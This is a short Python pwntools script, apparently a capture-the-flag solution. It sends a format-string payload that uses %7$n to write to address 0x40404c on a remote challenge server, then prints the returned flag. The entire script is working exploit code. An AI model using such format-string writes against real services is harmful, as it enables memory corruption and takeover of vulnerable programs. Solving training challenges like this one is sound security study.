from pwn import *

address = p64(0x40404c)
payload = b" %7$n   " + address
r = remote("formatted.challs.olicyber.it",10305)
r.recv(100)
r.sendline(payload)
r.recvuntil(b"flag{")
print("flag{" + r.recvuntil(b"}").decode())